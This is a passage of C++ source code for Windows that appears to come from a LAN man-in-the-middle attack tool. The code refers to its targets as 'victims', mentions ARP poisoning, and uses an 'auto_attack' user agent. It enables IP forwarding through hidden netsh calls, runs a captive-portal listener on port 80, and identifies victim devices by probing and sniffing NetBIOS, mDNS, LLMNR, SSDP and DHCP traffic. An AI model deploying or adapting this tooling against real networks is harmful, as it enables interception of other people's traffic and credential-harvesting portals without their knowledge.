    if (GetExtendedTcpTable(t, &size, FALSE, AF_INET,
                            TCP_TABLE_OWNER_PID_LISTENER, 0) != NO_ERROR)
        return "";
    for (DWORD i = 0; i < t->dwNumEntries; ++i) {
        const auto& row = t->table[i];
        if (ntohs((u_short)row.dwLocalPort) != port) continue;
        DWORD pid = row.dwOwningPid;
        char path[MAX_PATH] = {0};
        DWORD psz = MAX_PATH;
        HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (h) {
            QueryFullProcessImageNameA(h, 0, path, &psz);
            CloseHandle(h);
        }
        char out[512];
        snprintf(out, sizeof(out), "pid %lu%s%s", pid,
                 path[0] ? " (" : "", path[0] ? path : "");
        std::string s = out;
        if (path[0]) s += ")";
        return s;
    }
    return "";
}

static void portalLoop() {
    SOCKET ls = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (ls == INVALID_SOCKET) { g_portalActive = false; return; }

    int one = 1;
    setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));

    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port   = htons(80);
    a.sin_addr.s_addr = INADDR_ANY;

    if (bind(ls, (sockaddr*)&a, sizeof(a)) != 0) {
        std::string owner = tcpListenerOwner(80);
        if (!owner.empty())
            PF("[!] portal: port 80 is held by %s\n", owner.c_str());
        else
            PF("[!] portal: bind :80 failed (port busy or blocked)\n");
        PF("[!] free port 80, then press Send Message again - it will retry\n");
        closesocket(ls);
        g_portalRun = false;
        g_portalActive = false;
        return;
    }
    listen(ls, 32);
    g_portalActive = true;
    PF("[+] portal live on http://%s/ - captive-portal probes answered\n",
       g_myIp.c_str());

    while (g_portalRun) {
        fd_set rf; FD_ZERO(&rf); FD_SET(ls, &rf);
        timeval tv{1, 0};
        if (select(0, &rf, nullptr, nullptr, &tv) <= 0) continue;
        sockaddr_in c{};
        int cl = sizeof(c);
        SOCKET s = accept(ls, (sockaddr*)&c, &cl);
        if (s != INVALID_SOCKET) {
            char cip[16] = {0};
            inet_ntop(AF_INET, &c.sin_addr, cip, sizeof(cip));
            std::thread(respondPortal, s, std::string(cip)).detach();
        }
    }
    g_portalActive = false;
    closesocket(ls);
    PF("[-] portal stopped\n");
}

// per-interface forwarding. The registry value is NOT reliable: "netsh
// interface ipv4 set interface N forwarding=enabled" changes the live state
// without creating/updating HKLM\...\Interfaces\{GUID}\Forwarding (verified on
// Windows 11), so reading the key would always report "off" and a later stop
// would silently disable forwarding the user had already turned on. Ask the IP
// stack for the real per-interface flag and only fall back to the registry.
static bool readIfaceForwarding(DWORD& val) {
    if (g_ifIndex > 0) {
        MIB_IPINTERFACE_ROW row;
        memset(&row, 0, sizeof(row));
        row.Family = AF_INET;
        row.InterfaceIndex = (NET_IFINDEX)g_ifIndex;
        if (GetIpInterfaceEntry(&row) == NO_ERROR) {
            val = row.ForwardingEnabled ? 1 : 0;
            return true;
        }
    }
    if (g_ifGuid.empty()) return false;
    std::string key =
        "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces\\" +
        g_ifGuid;
    HKEY k;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, key.c_str(), 0, KEY_READ, &k)
        != ERROR_SUCCESS) return false;
    DWORD sz = sizeof(val), type = 0;
    LONG rc = RegQueryValueExA(k, "Forwarding", nullptr, &type,
                               (LPBYTE)&val, &sz);
    RegCloseKey(k);
    if (rc == ERROR_FILE_NOT_FOUND) { val = 0; return true; }
    return rc == ERROR_SUCCESS;
}

// run a console command hidden and wait for it (WinExec was fire-and-forget,
// so STATUS could report forwarding=on before netsh had actually applied it)
static int runHidden(const std::string& cmdline) {
    STARTUPINFOA si = {sizeof(si)};
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {0};
    std::string c = cmdline;
    if (!CreateProcessA(NULL, &c[0], NULL, NULL, FALSE,
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi))
        return -1;
    DWORD code = (DWORD)-1;
    DWORD w = WaitForSingleObject(pi.hProcess, 5000);
    if (w == WAIT_OBJECT_0) GetExitCodeProcess(pi.hProcess, &code);
    else TerminateProcess(pi.hProcess, 1);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return (int)code;
}

static bool enableForwarding(bool on) {
    if (g_ifIndex <= 0) {
        PF("[!] forwarding: no interface index (adapter discovery failed)\n");
        return false;
    }
    // Per-interface forwarding is what actually forwards transit packets
    // (verified with a real packet: TTL 64->63, egress to the gateway MAC).
    // Do NOT touch the global IPEnableRouter value: it persists across reboots,
    // so a crash mid-attack would leave this machine routing between every
    // interface (including VPN/host-only) after the next boot.
    char idxbuf[16];
    snprintf(idxbuf, sizeof(idxbuf), "%d", g_ifIndex);
    std::string cmd =
        "netsh interface ipv4 set interface " + std::string(idxbuf) +
        " forwarding=" + (on ? "enabled" : "disabled");
    int rc = runHidden(cmd);
    if (rc != 0) {
        PF("[!] forwarding: netsh failed (code %d)\n", rc);
        return false;
    }
    g_forwardingEnabled = on;
    g_forwardingTouched = true;
    return true;
}

// put the per-interface flag back exactly the way it was found
static void restoreForwarding() {
    if (!g_forwardingTouched.load()) return;
    bool back = g_ifaceFwdKnown ? g_ifaceFwdWasOn : false;
    if (enableForwarding(back)) {
        if (back) PF("[+] ip forwarding restored (on)\n");
        else      PF("[+] ip forwarding restored (off)\n");
    }
    g_forwardingTouched = false;
}

static void sanitizeName(std::string& n) {
    for (auto& ch : n)
        if ((unsigned char)ch < 0x20 || (unsigned char)ch > 0x7E || ch == '|')
            ch = '?';
    while (!n.empty() && (n.back() == '.' || n.back() == ' ')) n.pop_back();
    if (n.size() > 48) n.resize(48);
}

static int buildNbstatQuery(unsigned char* b, unsigned short id) {
    memset(b, 0, 50);
    b[0] = (unsigned char)(id >> 8); b[1] = (unsigned char)(id & 0xff);
    b[2] = 0x01; b[3] = 0x00; b[5] = 1; b[12] = 0x20;
    unsigned char name16[16]; memset(name16, 0, 16); name16[0] = '*';
    for (int i = 0; i < 16; ++i) {
        b[13 + i * 2] = (unsigned char)('A' + ((name16[i] >> 4) & 0x0F));
        b[14 + i * 2] = (unsigned char)('A' + (name16[i] & 0x0F));
    }
    b[45] = 0x00; b[46] = 0x00; b[47] = 0x21;
    b[48] = 0x00; b[49] = 0x01;
    return 50;
}

// append a DNS name in label form ("a.b.c" -> 1 a 1 b 1 c 0)
static void appendDnsName(unsigned char* b, int& p, const char* name) {
    const char* sp = name;
    while (sp && *sp) {
        const char* dot = strchr(sp, '.');
        int seg = dot ? (int)(dot - sp) : (int)strlen(sp);
        if (seg <= 0) break;
        b[p++] = (unsigned char)seg;
        memcpy(b + p, sp, seg);
        p += seg;
        sp = dot ? dot + 1 : nullptr;
    }
    b[p++] = 0x00;
}

static int buildPtrQuery(unsigned char* b, const char* ip, bool qu, unsigned short id) {
    unsigned a1, b1, c1, d1;
    if (sscanf(ip, "%u.%u.%u.%u", &a1, &b1, &c1, &d1) != 4) return 0;
    int p = 0;
    b[p++] = (unsigned char)(id >> 8); b[p++] = (unsigned char)(id & 0xff);
    b[p++] = 0x00; b[p++] = 0x00;   // flags: standard query
    b[p++] = 0x00; b[p++] = 0x01;   // QDCOUNT = 1
    b[p++] = 0x00; b[p++] = 0x00;   // ANCOUNT = 0
    b[p++] = 0x00; b[p++] = 0x00;   // NSCOUNT = 0
    b[p++] = 0x00; b[p++] = 0x00;   // ARCOUNT = 0
    char lab[64];
    snprintf(lab, sizeof(lab), "%u.%u.%u.%u.in-addr.arpa", d1, c1, b1, a1);
    appendDnsName(b, p, lab);
    b[p++] = 0x00; b[p++] = 0x0C;                 // QTYPE  = PTR
    // the mDNS "QU" (unicast-response) bit is the TOP bit of QCLASS, i.e.
    // 0x8001 - not 0x0081, which is a class no responder understands
    b[p++] = qu ? 0x80 : 0x00; b[p++] = 0x01;     // QCLASS = IN [| QU]
    return p;
}

// mDNS query for a DNS-SD service type, e.g. "_googlecast._tcp.local".
// The PTR answers name the instances ("Salon._googlecast._tcp.local") and the
// SRV/A records that ride along map those friendly names onto device IPs.
static int buildMdnsQuery(unsigned char* b, const char* name, unsigned short id) {
    int p = 0;
    b[p++] = (unsigned char)(id >> 8); b[p++] = (unsigned char)(id & 0xff);
    b[p++] = 0x00; b[p++] = 0x00;   // flags
    b[p++] = 0x00; b[p++] = 0x01;   // QDCOUNT
    b[p++] = 0x00; b[p++] = 0x00;   // ANCOUNT
    b[p++] = 0x00; b[p++] = 0x00;   // NSCOUNT
    b[p++] = 0x00; b[p++] = 0x00;   // ARCOUNT
    appendDnsName(b, p, name);
    b[p++] = 0x00; b[p++] = 0x0C;   // QTYPE  = PTR
    b[p++] = 0x80; b[p++] = 0x01;   // QCLASS = IN + unicast-response
    return p;
}

static std::string readName(const unsigned char* p, int len, int* pos) {
    std::string out;
    int cur = *pos, jumps = 0;
    bool jumped = false;
    while (cur < len && jumps < 8) {
        unsigned l = p[cur];
        if (l == 0) { cur++; if (!jumped) *pos = cur; break; }
        if ((l & 0xC0) == 0xC0) {
            if (cur + 1 >= len) break;
            int ptr = ((l & 0x3F) << 8) | p[cur + 1];
            if (!jumped) { *pos = cur + 2; jumped = true; }
            cur = ptr; jumps++; continue;
        }
        if (cur + 1 + (int)l > len) break;
        out.append((const char*)(p + cur + 1), l);
        out += '.';
        cur += 1 + (int)l;
        if (!jumped) *pos = cur;
    }
    while (!out.empty() && out.back() == '.') out.pop_back();
    return out;
}

static std::string parsePtrAnswer(const unsigned char* p, int len, std::string* owner = nullptr) {
    if (len < 12) return "";
    int qd = (p[4] << 8) | p[5];
    int an = (p[6] << 8) | p[7];
    int pos = 12;
    for (int i = 0; i < qd && pos < len; ++i) { readName(p, len, &pos); pos += 4; }
    for (int i = 0; i < an && pos + 12 <= len; ++i) {
        std::string own = readName(p, len, &pos);
        if (pos + 10 > len) return "";
        int type = (p[pos] << 8) | p[pos + 1];
        pos += 8;
        int rdlen = (p[pos] << 8) | p[pos + 1];
        pos += 2;
        if (type == 12 && rdlen > 0 && pos + rdlen <= len) {
            if (owner) *owner = own;
            return readName(p, len, &pos);
        }
        pos += rdlen;
    }
    return "";
}

static std::string revToIp(const std::string& owner) {
    size_t d = owner.find(".in-addr.arpa");
    if (d == std::string::npos) return "";
    std::string part = owner.substr(0, d);
    std::string seg[4];
    int n = 0;
    size_t s = 0;
    while (n < 4 && s <= part.size()) {
        size_t dot = part.find('.', s);
        if (dot == std::string::npos || n == 3) { seg[n++] = part.substr(s); break; }
        seg[n++] = part.substr(s, dot - s);
        s = dot + 1;
    }
    if (n != 4) return "";
    return seg[3] + "." + seg[2] + "." + seg[1] + "." + seg[0];
}

static std::string parseNbstat(const unsigned char* p, int len) {
    if (len < 12) return "";
    int qd = (p[4] << 8) | p[5];
    int pos = 12;
    for (int i = 0; i < qd && pos < len; ++i) {
        if (p[pos] == 0xC0 && pos + 1 < len) pos += 2;
        else if (p[pos] == 0x20 && pos + 34 <= len) pos += 34;
        else return "";
        pos += 4;
    }
    if (pos >= len) return "";
    if (p[pos] == 0xC0 && pos + 1 < len) pos += 2;
    else if (p[pos] == 0x20 && pos + 34 <= len) pos += 34;
    else return "";
    pos += 10;
    if (pos + 1 > len) return "";
    int n = p[pos++];
    std::string fallback;
    for (int i = 0; i < n && pos + 18 <= len; i++, pos += 18) {
        char nm[16];
        memcpy(nm, p + pos, 15);
        nm[15] = 0;
        unsigned char suf = p[pos + 15];
        std::string s(nm);
        while (!s.empty() && (s.back() == ' ' || s.back() == '\0')) s.pop_back();
        if (s.empty()) continue;
        if (suf == 0x00) return s;
        if (fallback.empty()) fallback = s;
    }
    return fallback;
}

// ---------------------------------------------------------------
// passive device-name learning
//
// The capture handle sees every broadcast (and, once ARP poisoning is
// running, every unicast) packet on the LAN.  Name services and DHCP are
// constantly announcing host names, so instead of relying only on the
// active probes in resolveNames() we learn names as they fly by.
// ---------------------------------------------------------------

// turn a raw DNS/mDNS/LLMNR/NetBIOS name into something worth showing.
// Returns false for service names, reverse names, bare IP labels, etc.
static bool plausibleHostName(const std::string& raw, std::string& out) {
    std::string n = raw;
    while (!n.empty() && (n.back() == '.' || n.back() == ' ')) n.pop_back();
    if (n.empty()) return false;

    std::string lower = toLower(n);
    if (lower == "localhost" || lower == "local" || lower == "wpad" ||
        lower == "isatap" || lower == "ip6-localhost")
        return false;
    if (lower.find("in-addr.arpa") != std::string::npos ||
        lower.find("ip6.arpa")     != std::string::npos)
        return false;

    // mDNS service instance: "Living Room TV._airplay._tcp.local" ->
    // "Living Room TV".  This is the friendly name the device advertises.
    size_t svc = lower.find("._");
    if (svc != std::string::npos) {
        n.resize(svc);
        lower.resize(svc);
    }

    // drop suffixes that add no information
    static const char* sfx[] = { ".local", ".lan", ".home", ".localdomain",
                                 ".home.arpa" };
    for (const char* s : sfx) {
        size_t sl = strlen(s);
        if (lower.size() > sl &&
            lower.compare(lower.size() - sl, sl, s) == 0) {
            n.resize(n.size() - sl);
            lower.resize(lower.size() - sl);
            break;
        }
    }
    while (!n.empty() && (n.back() == '.' || n.back() == ' ')) n.pop_back();
    if (n.size() < 2) return false;

    bool alpha = false;
    for (char c : n)
        if (isalpha((unsigned char)c)) { alpha = true; break; }
    if (!alpha) return false;          // "192-168-1-5" is not a name
    if (n[0] == '_') return false;     // "_ipp._tcp" service type

    sanitizeName(n);
    if (n.empty()) return false;
    out = n;
    return true;
}

static void setNameForIp(const std::string& ip, const std::string& raw, int prio) {
    std::string nm;
    if (ip.empty() || ip == g_myIp) return;
    if (!plausibleHostName(raw, nm)) return;
    std::lock_guard<std::mutex> lk(g_vmutex);
    for (auto& v : g_victims) {
        if (v.ip != ip) continue;
        if (prio >= v.namePrio) { v.name = nm; v.namePrio = prio; }
        return;
    }
}

static void setNameForMac(const std::string& mac, const std::string& raw, int prio) {
    std::string nm;
    if (mac.empty() || mac == "00:00:00:00:00:00") return;
    if (!plausibleHostName(raw, nm)) return;
    std::lock_guard<std::mutex> lk(g_vmutex);
    for (auto& v : g_victims) {
        if (stricmp(v.mac.c_str(), mac.c_str()) != 0) continue;
        if (prio >= v.namePrio) { v.name = nm; v.namePrio = prio; }
        return;
    }
}

// Parse a DNS/LLMNR/mDNS message and learn:
//   PTR  reverse-IP owner -> host name
//   A    host-name owner  -> IPv4 address
//   SRV  service instance -> target host, resolved through A records
// Question/authority/additional sections are all considered because mDNS
// puts most useful records in the additional section.
static void learnFromDns(const unsigned char* p, int len) {
    if (len < 12) return;
    int qd = (p[4] << 8) | p[5];
    int an = (p[6] << 8) | p[7];
    int ns = (p[8] << 8) | p[9];
    int ar = (p[10] << 8) | p[11];
    if (qd < 0 || qd > 64 || an < 0 || ns < 0 || ar < 0) return;

    struct SrvRec { std::string instance, target; };
    struct HostRec { std::string name, ip; };
    std::vector<SrvRec> srv;
    std::unordered_map<std::string, HostRec> hosts;        // lower(host) -> record
    std::vector<std::pair<std::string, std::string>> ptr;  // reverse owner, host

    int pos = 12;
    for (int i = 0; i < qd && pos < len; ++i) {
        (void)readName(p, len, &pos);
        pos += 4;
    }
    int total = an + ns + ar;
    if (total > 256) total = 256;      // sanity cap
    for (int i = 0; i < total && pos + 10 <= len; ++i) {
        std::string own = readName(p, len, &pos);
        if (pos + 10 > len) break;
        int type = (p[pos] << 8) | p[pos + 1];
        pos += 8;
        int rdlen = (p[pos] << 8) | p[pos + 1];
        pos += 2;
        if (rdlen < 0 || pos + rdlen > len) break;

        if (type == 12 && rdlen > 1) {          // PTR
            int save = pos;
            std::string target = readName(p, len, &pos);
            pos = save + rdlen;
            ptr.emplace_back(own, target);
        } else if (type == 1 && rdlen == 4) {   // A
            char ip[16];
            snprintf(ip, sizeof(ip), "%u.%u.%u.%u",
                     p[pos], p[pos + 1], p[pos + 2], p[pos + 3]);
            if (!own.empty()) hosts[toLower(own)] = {own, ip};
            pos += rdlen;
        } else if (type == 33 && rdlen > 6) {   // SRV
            int save = pos + 6;
            std::string target = readName(p, len, &save);
            pos += rdlen;
            if (!own.empty() && !target.empty())
                srv.push_back({own, target});
        } else {
            pos += rdlen;
        }
    }

    for (auto& r : ptr) {
        std::string ip = revToIp(r.first);
        if (!ip.empty()) setNameForIp(ip, r.second, 1);
    }
    for (auto& kv : hosts) {
        // owner may be a service instance; plausibleHostName strips that
        setNameForIp(kv.second.ip, kv.second.name, 2);
    }
    for (auto& s : srv) {
        auto it = hosts.find(toLower(s.target));
        if (it != hosts.end()) setNameForIp(it->second.ip, s.instance, 2);
    }
}

// DHCP option 12 (host name) and option 81 (FQDN) are sent by phones and
// PCs on every lease/renew.  The chaddr in the frame is the device MAC, so
// this names devices that never answer a NetBIOS/mDNS probe.
static std::string decodeDnsLabels(const unsigned char* p, int len) {
    std::string out;
    int pos = 0;
    while (pos < len) {
        int l = p[pos++];
        if (l == 0) break;
        if (l > 63 || pos + l > len) break;
        if (!out.empty()) out += '.';
        out.append((const char*)p + pos, l);
        pos += l;
    }
    return out;
}

static void learnFromDhcp(const unsigned char* d, int len, const std::string& mac) {
    if (len < 240) return;
    if (d[236] != 0x63 || d[237] != 0x82 || d[238] != 0x53 || d[239] != 0x63)
        return;                        // DHCP magic cookie
    std::string host, fqdn;
    int pos = 240;
    while (pos < len) {
        int opt = d[pos++];
        if (opt == 0) continue;        // pad
        if (opt == 255) break;         // end
        if (pos >= len) break;
        int l = d[pos++];
        if (l < 0 || pos + l > len) break;
        if (opt == 12) {
            host.assign((const char*)d + pos, l);
        } else if (opt == 81 && l > 3) {
            fqdn = decodeDnsLabels(d + pos + 3, l - 3);
        }
        pos += l;
    }
    if (!host.empty()) setNameForMac(mac, host, 5);
    if (!fqdn.empty()) setNameForMac(mac, fqdn, 5);
}

// WS-Discovery (used by Windows network neighbourhood / printers / cameras)
// carries <d:Computer>NAME</d:Computer> in its ProbeMatch replies.
static void learnFromWsDiscovery(const unsigned char* p, int len,
                                 const std::string& srcIp, const std::string& mac) {
    std::string s((const char*)p, len);
    size_t a = s.find("Computer>");
    if (a == std::string::npos) return;
    a += 9;
    size_t b = s.find('<', a);
    if (b == std::string::npos || b <= a) return;
    std::string nm = s.substr(a, b - a);
    setNameForIp(srcIp, nm, 5);
    setNameForMac(mac, nm, 5);
}

// ---- SSDP / UPnP active discovery -------------------------------------
// TVs, printers, NAS boxes and routers answer an SSDP M-SEARCH with a
// LOCATION URL pointing at their description XML, which contains a
// human-friendly <friendlyName>.  This names devices that ignore
// NetBIOS/mDNS/LLMNR entirely.
static std::string httpGetSmall(const std::string& host, int port,
                                const std::string& path, int timeoutMs) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return "";
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);

    sockaddr_in a{};
    a.sin_family = AF_INET;
    a.sin_port = htons((u_short)port);
    if (inet_pton(AF_INET, host.c_str(), &a.sin_addr) != 1) {
        closesocket(s);
        return "";
    }
    if (connect(s, (sockaddr*)&a, sizeof(a)) != 0) {
        fd_set wr; FD_ZERO(&wr); FD_SET(s, &wr);
        timeval tv{timeoutMs / 1000, (timeoutMs % 1000) * 1000};
        if (select(0, nullptr, &wr, nullptr, &tv) <= 0) {
            closesocket(s);
            return "";
        }
        int err = 0, el = sizeof(err);
        getsockopt(s, SOL_SOCKET, SO_ERROR, (char*)&err, &el);
        if (err != 0) { closesocket(s); return ""; }
    }

    std::string req = "GET " + (path.empty() ? "/" : path) +
                      " HTTP/1.0\r\nHost: " + host +
                      "\r\nUser-Agent: auto_attack\r\nConnection: close\r\n\r\n";
    send(s, req.data(), (int)req.size(), 0);

    std::string out;
    DWORD end = GetTickCount() + (DWORD)timeoutMs;
    char buf[2048];
    while ((LONG)(end - GetTickCount()) > 0 && out.size() < 65536) {
        fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
        timeval tv{0, 100000};
        if (select(0, &rd, nullptr, nullptr, &tv) <= 0) continue;
        int n = recv(s, buf, sizeof(buf), 0);
        if (n <= 0) break;
        out.append(buf, n);
        if (out.find("</root>") != std::string::npos ||
            out.find("</scpd>") != std::string::npos) break;
    }
    closesocket(s);
    return out;
}

static std::string xmlElement(const std::string& s, const char* tag) {
    std::string open  = std::string("<") + tag + ">";
    std::string close = std::string("</") + tag + ">";
    size_t a = s.find(open);
    if (a == std::string::npos) return "";
    a += open.size();
    size_t b = s.find(close, a);
    if (b == std::string::npos) return "";
    return s.substr(a, b - a);
}

static void learnFromSsdp(const std::vector<Victim>& snap) {
    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return;
    sockaddr_in b{};
    b.sin_family = AF_INET;
    b.sin_addr.s_addr = INADDR_ANY;
    b.sin_port = 0;
    bind(s, (sockaddr*)&b, sizeof(b));
    u_long nb = 1;
    ioctlsocket(s, FIONBIO, &nb);

    sockaddr_in m{};
    m.sin_family = AF_INET;
    m.sin_port = htons(1900);
    inet_pton(AF_INET, "239.255.255.250", &m.sin_addr);
    const char* req =
        "M-SEARCH * HTTP/1.1\r\n"
        "HOST: 239.255.255.250:1900\r\n"
        "MAN: \"ssdp:discover\"\r\n"
        "MX: 1\r\n"
        "ST: ssdp:all\r\n"
        "USER-AGENT: auto_attack\r\n\r\n";
    for (int i = 0; i < 2; ++i)
        sendto(s, req, (int)strlen(req), 0, (sockaddr*)&m, sizeof(m));

    struct Hit { std::string ip; int port; std::string path; };
    std::vector<Hit> hits;
    DWORD end = GetTickCount() + 800;
    while ((LONG)(end - GetTickCount()) > 0) {
        fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
        timeval tv{0, 100000};
        if (select(0, &rd, nullptr, nullptr, &tv) <= 0) continue;
        char buf[2048];
        sockaddr_in from{};
        int fl = sizeof(from);
        int n = recvfrom(s, buf, sizeof(buf) - 1, 0, (sockaddr*)&from, &fl);
        if (n <= 0) continue;
        buf[n] = 0;
        std::string resp(buf, n);
        size_t lp = toLower(resp).find("location:");
        if (lp == std::string::npos) continue;
        size_t e = resp.find("\r\n", lp);
        std::string loc = resp.substr(lp + 9,
            e == std::string::npos ? std::string::npos : e - lp - 9);
        while (!loc.empty() && (loc.front() == ' ' || loc.front() == '\t'))
            loc.erase(0, 1);
        if (loc.empty()) continue;

        std::string l = loc;
        if (toLower(l).rfind("http://", 0) == 0) l = l.substr(7);
        size_t sl = l.find('/');
        std::string hp   = (sl == std::string::npos) ? l : l.substr(0, sl);
        std::string path = (sl == std::string::npos) ? "/" : l.substr(sl);
        int port = 80;
        size_t co = hp.find(':');
        if (co != std::string::npos) {
            port = atoi(hp.substr(co + 1).c_str());
            hp = hp.substr(0, co);
        }
        if (hp.empty()) continue;
        bool known = false;
        for (auto& v : snap) if (v.ip == hp) { known = true; break; }
        if (!known) continue;
        bool dup = false;
        for (auto& h : hits)
            if (h.ip == hp && h.port == port) { dup = true; break; }
        if (!dup) hits.push_back({hp, port, path});
    }
    closesocket(s);

    int fetched = 0;
    for (auto& h : hits) {
        if (fetched >= 4) break;
        if (victimNamePrio(h.ip) >= 6) continue;  // already has a friendly name
        std::string xml = httpGetSmall(h.ip, h.port, h.path, 500);
        std::string nm = xmlElement(xml, "friendlyName");
        if (nm.empty()) nm = xmlElement(xml, "modelName");
        if (!nm.empty()) { setNameForIp(h.ip, nm, 6); fetched++; }
    }
}

static void resolveNames() {
    std::vector<Victim> snap;
    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        snap = g_victims;
    }
    if (snap.empty()) { PF("[!] no hosts known - scan first\n"); return; }

    SOCKET s = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (s == INVALID_SOCKET) return;
    int one = 1;
    setsockopt(s, SOL_SOCKET, SO_REUSEADDR, (char*)&one, sizeof(one));
    sockaddr_in self{};
    self.sin_family = AF_INET;
    self.sin_addr.s_addr = INADDR_ANY;
    self.sin_port = 0;
    bind(s, (sockaddr*)&self, sizeof(self));
    u_long nbio = 1;
    ioctlsocket(s, FIONBIO, &nbio);

    PF("[*] resolving device names (netbios/llmnr/mdns/dns/ssdp)...\n");
    unsigned short baseId = (unsigned short)(GetTickCount() & 0x0FFF);
    for (size_t i = 0; i < snap.size(); ++i) {
        sockaddr_in d{};
        d.sin_family = AF_INET;
        d.sin_addr.s_addr = inet_addr(snap[i].ip.c_str());

        unsigned char q[128];
        int len = buildNbstatQuery(q, (unsigned short)(baseId + i));
        d.sin_port = htons(137);
        sendto(s, (const char*)q, len, 0, (sockaddr*)&d, sizeof(d));

        len = buildPtrQuery(q, snap[i].ip.c_str(), false, (unsigned short)(baseId + 0x200 + i));
        if (len > 0) { d.sin_port = htons(5355); sendto(s, (const char*)q, len, 0, (sockaddr*)&d, sizeof(d)); }

        len = buildPtrQuery(q, snap[i].ip.c_str(), true, 0);
        if (len > 0) {
            sockaddr_in m{};
            m.sin_family = AF_INET; m.sin_port = htons(5353);
            m.sin_addr.s_addr = inet_addr("224.0.0.251");
            // multicast is lossy: send the QU (unicast-response) probe twice
            sendto(s, (const char*)q, len, 0, (sockaddr*)&m, sizeof(m));
            sendto(s, (const char*)q, len, 0, (sockaddr*)&m, sizeof(m));
        }

        len = buildPtrQuery(q, snap[i].ip.c_str(), false, (unsigned short)(baseId + 0x400 + i));
        if (len > 0 && !g_gatewayIp.empty()) {
            sockaddr_in r{}; r.sin_family = AF_INET;
            r.sin_addr.s_addr = inet_addr(g_gatewayIp.c_str());
            r.sin_port = htons(53);
            sendto(s, (const char*)q, len, 0, (sockaddr*)&r, sizeof(r));
        }
    }

    // NetBIOS node-status also answers a broadcast.  Some Windows hosts drop
    // the unicast probe (local firewall) but still answer the subnet
    // broadcast, so send one of each.
    {
        unsigned char q[64];
        int len = buildNbstatQuery(q, (unsigned short)(baseId + 0x500));
        std::string b = g_myIp;
        size_t dot = b.find_last_of('.');
        std::vector<std::string> casts = {"255.255.255.255"};
        if (dot != std::string::npos) casts.push_back(b.substr(0, dot) + ".255");
        for (auto& bc : casts) {
            sockaddr_in d{};
            d.sin_family = AF_INET; d.sin_port = htons(137);
            d.sin_addr.s_addr = inet_addr(bc.c_str());
            sendto(s, (const char*)q, len, 0, (sockaddr*)&d, sizeof(d));
        }
    }

    // DNS-SD service enumeration.  Phones, TVs, printers, NAS boxes and
    // speakers answer these with PTR/SRV/A records whose instance names are
    // the friendly names shown in their setup apps ("Living Room TV").
    // Sent once (not per device) because the answers are multicast.
    {
        static const char* svc[] = {
            "_services._dns-sd._udp.local",
            "_googlecast._tcp.local",  "_airplay._tcp.local",
            "_raop._tcp.local",        "_spotify-connect._tcp.local",
            "_sonos._tcp.local",       "_amzn-wplay._tcp.local",
            "_androidtvremote2._tcp.local",
            "_companion-link._tcp.local", "_sleep-proxy._udp.local",
            "_afpovertcp._tcp.local",  "_sftp-ssh._tcp.local",
            "_ssh._tcp.local",         "_rfb._tcp.local",
            "_ipp._tcp.local",         "_printer._tcp.local",
            "_http._tcp.local",        "_workstation._tcp.local",
            "_smb._tcp.local",         "_device-info._tcp.local",
            "_hap._tcp.local",         "_googlezone._tcp.local"
        };
        sockaddr_in m{};
        m.sin_family = AF_INET; m.sin_port = htons(5353);
        inet_pton(AF_INET, "224.0.0.251", &m.sin_addr);
        unsigned short sid = (unsigned short)(baseId + 0x600);
        for (const char* name : svc) {
            unsigned char q[160];
            int len = buildMdnsQuery(q, name, sid++);
            // multicast is lossy - repeat each probe
            sendto(s, (const char*)q, len, 0, (sockaddr*)&m, sizeof(m));
            sendto(s, (const char*)q, len, 0, (sockaddr*)&m, sizeof(m));
        }
    }

    int replies = 0;
    DWORD deadline = GetTickCount() + 1100;
    while ((LONG)(deadline - GetTickCount()) > 0) {
        fd_set rd; FD_ZERO(&rd); FD_SET(s, &rd);
        timeval tv; tv.tv_sec = 0; tv.tv_usec = 80000;
        if (select(0, &rd, nullptr, nullptr, &tv) <= 0) continue;
        unsigned char buf[1500];
        sockaddr_in from{}; int flen = sizeof(from);
        int n = recvfrom(s, (char*)buf, sizeof(buf), 0, (sockaddr*)&from, &flen);
        if (n <= 0) continue;
        char* rip = inet_ntoa(from.sin_addr);
        if (!rip) continue;
        replies++;
        int port = ntohs(from.sin_port);

        if (strcmp(rip, g_gatewayIp.c_str()) == 0 && port == 53) {
            learnFromDns(buf, n);
            std::string owner, nm;
            nm = parsePtrAnswer(buf, n, &owner);
            std::string ownerIp = revToIp(owner);
            std::string clean;
            if (!nm.empty() && !ownerIp.empty() && plausibleHostName(nm, clean)) {
                for (auto& v : snap)
                    if (v.ip == ownerIp) {
                        if (1 >= v.namePrio) { v.name = clean; v.namePrio = 1; }
                    }
            }
            continue;
        }

        Victim* it = nullptr;
        for (auto& v : snap) if (v.ip == rip) { it = &v; break; }
        if (!it) continue;

        std::string nm; int prio = 1;
        if (port == 137)       { nm = parseNbstat(buf, n);    prio = 4; }
        else if (port == 5355) { nm = parsePtrAnswer(buf, n); prio = 3; }
        else if (port == 5353) { nm = parsePtrAnswer(buf, n); prio = 2; }
        else                   { nm = parsePtrAnswer(buf, n); prio = 1; }
        // harvest A/SRV/PTR records too: mDNS service answers carry the
        // useful host mapping in their answer/additional sections
        if (port != 137) learnFromDns(buf, n);
        if (nm.empty()) continue;
        std::string clean;
        if (!plausibleHostName(nm, clean)) continue;
        if (prio >= it->namePrio) { it->name = clean; it->namePrio = prio; }
    }
    closesocket(s);

    {
        std::lock_guard<std::mutex> lk(g_vmutex);
        for (auto& sv : snap) {
            if (sv.name.empty()) continue;
            for (auto& gv : g_victims)
                if (gv.ip == sv.ip) {
                    if (sv.namePrio >= gv.namePrio) {
                        gv.name = sv.name; gv.namePrio = sv.namePrio;
                    }
